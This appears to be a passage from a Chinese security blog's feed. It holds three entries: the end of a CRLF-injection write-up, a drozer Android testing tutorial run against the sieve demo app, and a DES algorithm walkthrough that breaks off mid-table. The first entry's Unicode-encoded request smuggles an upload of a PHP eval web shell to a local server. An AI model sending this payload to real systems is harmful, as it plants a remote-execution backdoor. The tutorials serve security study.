chr(0x0100+ord(i))</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload_encode(payload)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>构造请求：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#39;)</span><br></pre></td></tr></table></figure>成功实现了目标本地的http请求<br><img src="/images/pasted-48.png" alt="upload successful"></li></ul><hr><ul><li>参考来源：<a href="https://www.anquanke.com/post/id/240014">初识HTTP响应拆分攻击（CRLF Injection）</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>drozer安装和使用</title>
      <link href="2021/05/20/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>2021/05/20/drozer%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="一、什么是drozer？"><a href="#一、什么是drozer？" class="headerlink" title="一、什么是drozer？"></a>一、什么是drozer？</h3><ul><li>Drozer是MWR Labs开发的一款Android安全测试框架。是目前最好的Android安全测试工具之一。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”在Web世界已经有了许多安全测试工具了,我们只需要给出一个目标,这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同,Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试,用户在自己的工作站上输入命令,Drozer会将命令发送到Android设备上的代理程序执行。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。</li></ul><h3 id="二、drozer安装"><a href="#二、drozer安装" class="headerlink" title="二、drozer安装"></a>二、drozer安装</h3><ol><li>下载drozer，解压把Drozer工具包drozer-installer-2.3.4.zip解压后看到的目录如下图，其中setup.exe文件是安装在PC机上面的，agent.apk是安装在手机模拟器或者移动手机里面的。</li></ol><p><img src="/images/pasted-14.png" alt="upload successful"></p><ol start="2"><li>使用adb工具把“agent.apk”安装到模拟器中去。首先确保adb与模拟器或者是实体机已经连接好了，然后使用“adb install agent.apk”命令进行安装。或者是直接将APK放到实体机中安装。应用列表中出现如下图标证明已经安装好了。</li></ol><p><img src="/images/pasted-15.png" alt="upload successful"></p><h3 id="三、drozer启动"><a href="#三、drozer启动" class="headerlink" title="三、drozer启动"></a>三、drozer启动</h3><ol><li>在android端设置启用“drozer agent”，运行drozer，然后点击embedded server。</li></ol><p><img src="/images/pasted-16.png" alt="upload successful"></p><ol start="2"><li>点击enable启动drozer server。</li></ol><p><img src="/images/pasted-17.png" alt="upload successful"></p><ol start="3"><li>在PC机drozer目录下输入以下命令，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\drozer&gt;adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure> 这里drozer Server默然监听的为31415端口，所以需要在主机上同样与31415端口进行通信，本地电脑上调用adb执行命令：adb forward tcp:31415 tcp:31415 进行端口转发;<br> 然后运行drozer console connect，出现以下 “dz&gt;”提示符，说明通信成功.</li></ol><p><img src="/images/pasted-18.png" alt="upload successful"></p><h3 id="四、drozer使用"><a href="#四、drozer使用" class="headerlink" title="四、drozer使用"></a>四、drozer使用</h3><ol><li>查找终端设备所有APK信息.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run app.package.list</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-19.png" alt="upload successful"></p><ol start="2"><li>通过关键字过滤来匹配显示目标数据包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run app.package.list -f settings</span><br></pre></td></tr></table></figure></li></ol><ul><li>含义：-f是过滤的意思，通过后面的关键字过滤来匹配显示。</li></ul><p><img src="/images/pasted-20.png" alt="upload successful"></p><ol start="3"><li>查看指定apk的信息，例如查看百度地图app的信息.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-21.png" alt="upload successful"></p><ol start="4"><li>查找APK存在的攻击面.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run app.package.attacksurface com.baidu.BaiduMap</span><br></pre></td></tr></table></figure></li></ol><ul><li>含义：查找APK存在的攻击面(activity、content、provider、service)</li></ul><p><img src="/images/pasted-22.png" alt="upload successful"></p><ol start="5"><li>获取activity信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-23.png" alt="upload successful"></p><ol start="6"><li>启动activity<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity</span><br></pre></td></tr></table></figure></li></ol><ul><li>使用方法：run app.activity.start –component 包名 activity组件名<br>help app.activity.start命令时查看app.activity.start命令的使用方法</li></ul><p><img src="/images/pasted-24.png" alt="upload successful"><br>执行命令之后在模拟器或者是实体机上会启动对应的activity.</p><ol start="7"><li>获取Content Provider信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-25.png" alt="upload successful"></p><ol start="8"><li>获取所有可以访问的Uri——Content Providers（数据泄露）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-28.png" alt="upload successful"></p><ol start="9"><li>获取各个Uri的数据—Content Providers（数据泄露）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-29.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords –vertical</span><br></pre></td></tr></table></figure><p>加上 “–vertical”只显示结果</p><p><img src="/images/pasted-30.png" alt="upload successful"></p><ol start="10"><li>检测SQL注入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-31.png" alt="upload successful"></p><ol start="11"><li>检测目录遍历<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-32.png" alt="upload successful"></p><ul><li>[参考来源]（<a href="https://blog.51cto.com/laoyinga/2052997%EF%BC%89">https://blog.51cto.com/laoyinga/2052997）</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理及实现</title>
      <link href="2021/05/18/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"/>
      <url>2021/05/18/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="一、什么是DES加密？"><a href="#一、什么是DES加密？" class="headerlink" title="一、什么是DES加密？"></a>一、什么是DES加密？</h3><ul><li>DES 算法是一种常见的分组加密算法，由IBM公司在1971年提出。DES 算法是分组加密算法的典型代表，同时也是应用最为广泛的对称加密算法。</li></ul><h3 id="二、基础名词解释"><a href="#二、基础名词解释" class="headerlink" title="二、基础名词解释"></a>二、基础名词解释</h3><ul><li><p>明文：<br>明文是指没有经过加密的数据。一般而言，明文都是等待传输的数据。由于没有经过加密，明文很容易被识别与破解，因此在传输明文之前必须进行加密处理。</p></li><li><p>密文：<br>密文只是明文经过某种加密算法而得到的数据，通常密文的形式复杂难以识别及理解。</p></li><li><p>密钥：<br>密钥是一种参数，它是在明文转换为密文或将密文转换为明文的算法中输入的参数。</p></li><li><p>对称加密：<br>通信双方同时掌握一个密钥，加密解密都是由一个密钥完成的（即加密密钥等于解密密钥，加解密密钥可以相互推倒出来）。双方通信前共同拟定一个密钥，不对第三方公开。</p></li><li><p>分组密码：<br>分组密码是将明文分成固定长度的组，每一组都采用同一密钥和算法进行加密，输出也是固定长度的密文。</p></li></ul><h3 id="三、DES加密算法详解"><a href="#三、DES加密算法详解" class="headerlink" title="三、DES加密算法详解"></a>三、DES加密算法详解</h3><ol><li><h4 id="DES-加密算法"><a href="#DES-加密算法" class="headerlink" title="DES 加密算法"></a>DES 加密算法</h4></li></ol><ul><li><p>分组长度<br>DES 加密算法中，明文和密文为 64 位分组。密钥的长度为 64 位，但是密钥的每个第八位设置为奇偶校验位，因此密钥的实际长度为56位。</p></li><li><p>加密流程<br>DES 加密算法大致分为 4 个步骤：<br>（1）初始置换<br>（2）生成子密钥<br>（3）迭代过程<br>（4）逆置换</p></li><li><p>整个过程流程图：</p></li></ul><p><img src="/images/pasted-8.png" alt="加密流程"></p><ol start="2"><li><h4 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h4></li></ol><ul><li>初始置换是将原始明文经过IP置换表处理。置换过程如图：</li></ul><p><img src="/images/pasted-9.png" alt="upload successful"></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">输入64位明文数据M（64位）：</span><br><span class="line">明文M（64位）&#x3D;</span><br><span class="line">0110001101101111011011010111000001110101011101000110010101110010</span><br><span class="line"></span><br><span class="line">选取密钥K（64位）：</span><br><span class="line">密钥K（64位）&#x3D;</span><br><span class="line">0001001100110100010101110111100110011011101111001101111111110001</span><br></pre></td></tr></table></figure><ul><li><p>IP置换表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">58,50,42,34,26,18,10,02,</span><br><span class="line">60,52,44,36,28,20,12,04,</span><br><span class="line">62,54,46,38,30,22,14,06,</span><br><span class="line">64,56,48,40,32,24,16,08,</span><br><span class="line">57,49,41,33,25,17,09,01,</span><br><span class="line">59,51,43,35,27,19,11,03,</span><br><span class="line">61,53,45,37,29,21,13,05,</span><br><span class="line">63,55,47,39,31,23,15,07,</span><br></pre></td></tr></table></figure><p>IP置换表中的数据指的是位置，例如58指将M第58位放置第1位。</p></li><li><p>M经过IP置换后为M’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">M’（64位） &#x3D;</span><br><span class="line">1111111110111000011101100101011100000000111111110000011010000011</span><br><span class="line"></span><br><span class="line">取M’的前32位作为L0，则有</span><br><span class="line">L0（32位）&#x3D; 11111111101110000111011001010111</span><br><span class="line"></span><br><span class="line">取M’的后32位作为R0，则有</span><br><span class="line">R0（32位）&#x3D; 00000000111111110000011010000011</span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li><h4 id="生成子密钥"><a href="#生成子密钥" class="headerlink" title="生成子密钥"></a>生成子密钥</h4></li></ol><ul><li>DES 加密共执行16次迭代，每次迭代过程的数据长度为48位，因此需要16个48位的子密钥来进行加密，生成子密钥的过程如下：</li></ul><p><img src="/images/pasted-10.png" alt="upload successful"></p><ul><li>密钥的计算过程：<br>  （1）第一轮置换：将64位的初始密钥置换成56位<hr><pre><code>密钥 K = 0001001100110100010101110111100110011011101111001101111111110001需经过PC-1表置换，即执行置换选择1过程。</code></pre>PC-1表为： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">57,49,41,33,25,17,09</span><br><span class="line">01,58,50,42,34,26,18</span><br><span class="line">10,02,59,51,43,35,27</span><br><span class="line">19,11,03,60,52,44,36</span><br><span class="line">63,55,47,39,31,23,15</span><br><span class="line">07,62,54,46,38,30,22</span><br><span class="line">14,06,61,53,45,37,29</span><br><span class="line">21,13,05,28,20,12,04</span><br></pre></td></tr></table></figure>PC-1表为8行7列的表，密钥K经PC-1后变为56位数据K’。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">K’（56位）&#x3D; 11110000110011001010101011110101010101100110011110001111</span><br><span class="line"></span><br><span class="line">取K’的前28位作为C0，则有</span><br><span class="line">C0（28位）&#x3D; 1111000011001100101010101111</span><br><span class="line"></span><br><span class="line">取K’的后28位作为D0，则有</span><br><span class="line">D0（28位）&#x3D; 0101010101100110011110001111</span><br></pre></td></tr></table></figure>获得C0，D0后进行左移操作需要查询移动位数表：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">轮数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16</span><br><span class="line">位数 1 1 2 2 2 2 2 2 1  2  2  2  2  2  2  1</span><br></pre></td></tr></table></figure>进行第一轮移位，轮数为1，查表得左移位数为1。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C0左移1位为C1：</span><br><span class="line">C1（28位） &#x3D; 1110000110011001010101011111</span><br><span class="line"></span><br><span class="line">D0左移1位为D1：</span><br><span class="line">D1（28位） &#x3D; 1010101011001100111100011110</span><br></pre></td></tr></table></figure></li></ul><hr><pre><code>（2）第二轮置换，为生成子密钥的循环步骤。将56位变为48位</code></pre><hr><pre><code>将C1和D1合并后，经过PC-2表置换得到子密钥K1，PC-2表中去除了第9，18，22，25，35，38，43，54位。    PPC-2表为6X8的表，PC-2表如下：</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">14,17,11,24,01,05,</span><br><span class="line">03,28,15,06,21,10,</span><br><span class="line">23,19,12,04,26,08,</span><br><span class="line">16,07,27,20,13,02,</span><br><span class="line">41,52,31,37,47,55,</span><br><span class="line">30,40,51,45,33,48,</span><br><span class="line">44,49,39,56,34,53,</span><br><span class="line">46,42,50,36,29,32</span><br></pre></td></tr></table></figure><p>  由于PC-2表为6X8的表，经PC-2置换后的数据为48位，置换后得到密钥K1，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K1（48位）&#x3D; 000110110000001011101111111111000111000001110010</span><br></pre></td></tr></table></figure><ul><li>此时成功生成了第一组密钥！！！</li></ul><p>  C1和D1再次左移，轮数 = 2，查表得左移位数 = 1，则C1和D1左移1位得到C2和D2。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C2（28位）&#x3D; 1100001100110010101010111111</span><br><span class="line">D2（28位）&#x3D; 0101010110011001111000111101</span><br></pre></td></tr></table></figure><br>C2和D2合并后为56位，经过PC-2表置换得到密钥K2（48位）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K2（48位）&#x3D; 011110011010111011011001110110111100100111100101</span><br></pre></td></tr></table></figure><ul><li>此时生成了第二组密钥！！！<br>依次类推，得到K3-K16子密钥，注意Ci和Di左移的位数。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">C3（28位） &#x3D; 0000110011001010101011111111</span><br><span class="line">D3（28位） &#x3D; 0101011001100111100011110101</span><br><span class="line">K3（48位） &#x3D; 010101011111110010001010010000101100111110011001</span><br><span class="line"></span><br><span class="line">C4（28位） &#x3D; 0011001100101010101111111100</span><br><span class="line">D4（28位） &#x3D; 0101100110011110001111010101</span><br><span class="line">K4（48位） &#x3D; 011100101010110111010110110110110011010100011101</span><br><span class="line"></span><br><span class="line">C5（28位） &#x3D; 1100110010101010111111110000</span><br><span class="line">D5（28位） &#x3D; 0110011001111000111101010101</span><br><span class="line">K5（48位） &#x3D; 011111001110110000000111111010110101001110101000</span><br><span class="line"></span><br><span class="line">C6（28位） &#x3D; 0011001010101011111111000011</span><br><span class="line">D6（28位） &#x3D; 1001100111100011110101010101</span><br><span class="line">K6（48位） &#x3D; 011000111010010100111110010100000111101100101111</span><br><span class="line"></span><br><span class="line">C7（28位） &#x3D; 1100101010101111111100001100</span><br><span class="line">D7（28位） &#x3D; 0110011110001111010101010110</span><br><span class="line">K7（48位） &#x3D; 111011001000010010110111111101100001100010111100</span><br><span class="line"></span><br><span class="line">C8（28位） &#x3D; 0010101010111111110000110011</span><br><span class="line">D8（28位） &#x3D; 1001111000111101010101011001</span><br><span class="line">K8（48位） &#x3D; 111101111000101000111010110000010011101111111011</span><br><span class="line"></span><br><span class="line">C9（28位） &#x3D; 0101010101111111100001100110</span><br><span class="line">D9（28位） &#x3D; 0011110001111010101010110011</span><br><span class="line">K9（48位） &#x3D; 111000001101101111101011111011011110011110000001</span><br><span class="line"></span><br><span class="line">C10（28位） &#x3D; 0101010111111110000110011001</span><br><span class="line">D10（28位） &#x3D; 1111000111101010101011001100</span><br><span class="line">K10（48位） &#x3D; 101100011111001101000111101110100100011001001111</span><br><span class="line"></span><br><span class="line">C11（28位） &#x3D; 0101011111111000011001100101</span><br><span class="line">D11（28位） &#x3D; 1100011110101010101100110011</span><br><span class="line">K11（48位） &#x3D; 001000010101111111010011110111101101001110000110</span><br><span class="line"></span><br><span class="line">C12（28位） &#x3D; 0101111111100001100110010101</span><br><span class="line">D12（28位） &#x3D; 0001111010101010110011001111</span><br><span class="line">K12（48位） &#x3D; 011101010111000111110101100101000110011111101001</span><br><span class="line"></span><br><span class="line">C13（28位） &#x3D; 0111111110000110011001010101</span><br><span class="line">D13（28位） &#x3D; 0111101010101011001100111100</span><br><span class="line">K13（48位） &#x3D; 100101111100010111010001111110101011101001000001</span><br><span class="line"></span><br><span class="line">C14（28位） &#x3D; 1111111000011001100101010101</span><br><span class="line">D14（28位） &#x3D; 1110101010101100110011110001</span><br><span class="line">K14（48位） &#x3D; 010111110100001110110111111100101110011100111010</span><br><span class="line"></span><br><span class="line">C15（28位） &#x3D; 1111100001100110010101010111</span><br><span class="line">D15（28位） &#x3D; 1010101010110011001111000111</span><br><span class="line">K15（48位） &#x3D; 101111111001000110001101001111010011111100001010</span><br><span class="line"></span><br><span class="line">C16（28位） &#x3D; 1111000011001100101010101111</span><br><span class="line">D16（28位） &#x3D; 0101010101100110011110001111</span><br><span class="line">K16（48位） &#x3D; 110010110011110110001011000011100001011111110101</span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4>设Li（32位）和Ri（32位）为第i次迭代结果的左半部分与右半部分，子密钥Ki为第i轮的48位加密密钥。定义运算规则：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Li &#x3D; Ri-1;</span><br><span class="line">Ri &#x3D; Li ⊕ f(Ri-1, Ki);</span><br></pre></td></tr></table></figure> 整个迭代过程如下图：</li></ol><p><img src="/images/pasted-11.png" alt="upload successful"></p><ul><li>文明扩展置换<br>右半部分Ri的位数为32位，而密钥长度Ki为48位，为了能够保证Ri与Ki可以进行异或运算需要对Ri位数进行扩展，用于扩展置换表E如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">32,01,02,03,04,05,</span><br><span class="line">04,05,06,07,08,09,</span><br><span class="line">08,09,10,11,12,13,</span><br><span class="line">12,13,14,15,16,17,</span><br><span class="line">16,17,18,19,20,21,</span><br><span class="line">20,21,22,23,24,25,</span><br><span class="line">24,25,26,27,28,29,</span><br><span class="line">28,29,30,31,32,01</span><br></pre></td></tr></table></figure>例如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L0（32位） &#x3D; 11111111101110000111011001010111</span><br><span class="line">R0（32位） &#x3D; 00000000111111110000011010000011</span><br></pre></td></tr></table></figure>R0（32位）经过扩展置换后变为48位数据：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E(R0)（48位） &#x3D; 100000000001011111111110100000001101010000000110</span><br></pre></td></tr></table></figure>将E(R0)（48位）与K1（48位）作异或运算<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  100000000001011111111110100000001101010000000110</span><br><span class="line">  000110110000001011101111111111000111000001110010</span><br><span class="line">&#x3D; 100110110001010100010001011111001010010001110100</span><br></pre></td></tr></table></figure>得到：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E(R0)^K1（48位） &#x3D; 100110110001010100010001011111001010010001110100</span><br></pre></td></tr></table></figure></li></ul><ul><li>S-盒替代<br>代替运算由8个不同的代替盒（S盒）完成。每个S盒有6位输入，4位输出。代替运算流程如下：</li></ul><p><img src="/images/pasted-12.png" alt="upload successful"><br>  S-盒1：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">14,04,13,01,02,15,11,08,03,10,06,12,05,09,00,07,</span><br><span class="line">00,15,07,04,14,02,13,01,10,06,12,11,09,05,03,08,</span><br><span class="line">04,01,14,08,13,06,02,11,15,12,09,07,03,10,05,00,</span><br><span class="line">15,12,08,02,04,09,01,07,05,11,03,14,10,00,06,13,</span><br></pre></td></tr></table></figure><br>S-盒2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">15,01,08,14,06,11,03,04,09,07,02,13,12,00,05,10,</span><br><span class="line">03,13,04,07,15,02,08,14,12,00,01,10,06,09,11,05,</span><br><span class="line">00,14,07,11,10,04,13,01,05,08,12,06,09,03,02,15,</span><br><span class="line">13,08,10,01,03,15,04,02,11,06,07,12,00,05,14,09,</span><br></pre></td></tr></table></figure><p>S-盒3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10,00,09,14,06,03,15,05,01,13,12,07,11,04,02,08,</span><br><span class="line">13,07,00,09,03,04,06,10,02,08,05,14,12,11,15,01,</span><br><span class="line">13,06,04,09,08,15,03,00,11,01,02,12,05,10,14,07,</span><br><span class="line">01,10,13,00,06,09,08,07,04,15,14,03,11,05,02,12,</span><br></pre></td></tr></table></figure><p>S-盒4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 